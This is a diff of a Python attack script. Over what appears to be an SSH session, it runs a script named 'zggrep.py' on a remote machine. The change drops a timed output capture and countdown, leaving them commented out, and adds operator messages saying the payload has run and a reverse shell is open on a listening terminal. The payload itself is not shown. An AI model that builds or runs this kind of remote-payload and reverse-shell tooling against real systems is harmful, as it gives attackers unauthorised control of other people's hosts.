@@ -114,24 +114,37 @@ try:
     
     
     shell.send(b"python zggrep.py\n")
-        
-    print("you have 90 seconds")
-    time.sleep(85)
-    output = ""
-    while shell.recv_ready():
-        output += shell.recv(4096).decode("utf-8")     
-    print(output)
     
-    print("shutting down in 5...")
-    time.sleep(1)
-    print("4...")
-    time.sleep(1)
-    print("3...")
-    time.sleep(1)
-    print("2...")
-    time.sleep(1)
-    print("1...")
-    time.sleep(1)
+        
+    print("Payload has run, use the listening terminal to access host.")
+    while True:
+        user_input = input("Type 'exit' to close reverse shell: ")
+    
+        if user_input.strip().lower() == 'exit':
+            print("Closing program...")
+            break
+        else:
+            print(f"You typed: {user_input}")
+            
+    # print("you have 90 seconds")
+    # time.sleep(85)
+    # output = ""
+    # while shell.recv_ready():
+    #     output += shell.recv(4096).decode("utf-8")     
+    # print(output)
+    
+    
+    
+    # print("shutting down in 5...")
+    # time.sleep(1)
+    # print("4...")
+    # time.sleep(1)
+    # print("3...")
+    # time.sleep(1)
+    # print("2...")
+    # time.sleep(1)
+    # print("1...")
+    # time.sleep(1)
     
 finally:
     # close the connection
